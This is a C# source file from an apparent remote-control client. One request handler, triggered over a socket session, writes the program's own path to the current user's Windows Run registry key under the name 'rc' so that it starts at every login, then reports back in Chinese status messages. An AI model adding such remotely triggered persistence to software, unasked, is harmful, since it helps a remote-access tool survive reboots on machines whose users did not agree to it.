using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;

namespace RemoteControl.Client
{
    class RequestAddAutoRunHandler : IRequestHandler
    {
        public void Handle(SocketSession session, object reqObj)
        {
            RequestAddAutoRun req = reqObj as RequestAddAutoRun;

            ResponseAddAutoRun resp = new ResponseAddAutoRun();
            try
            {
                RegistryKey rootKey = RegistryKey.OpenBaseKey(
                                                    RegistryHive.CurrentUser,
                                                    Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
                
                // 注意：调用OpenSubKey函数时，将第二参数设备true，才可以修改value值
                RegistryKey runKey = rootKey.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                bool runExists = runKey.GetValueNames().ToList().Contains("rc");
                if (runExists)
                {
                    var v = runKey.GetValue("rc").ToString();
                    if (v != Application.ExecutablePath)
                    {
                        runKey.SetValue("rc", Application.ExecutablePath);
                        resp.Message = "已更新自启动路径";
                    }
                    else
                    {
                        resp.Message = "已设置开机自启";
                    }
                }
                else
                {
                    runKey.SetValue("rc", Application.ExecutablePath);
                    resp.Message = "已添加自启动";
                }
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.ToString();
                resp.Detail = ex.StackTrace.ToString();
            }

            session.Send(ePacketType.PACKET_ADD_AUTORUN_RESPONSE, resp);
        }
    }
}
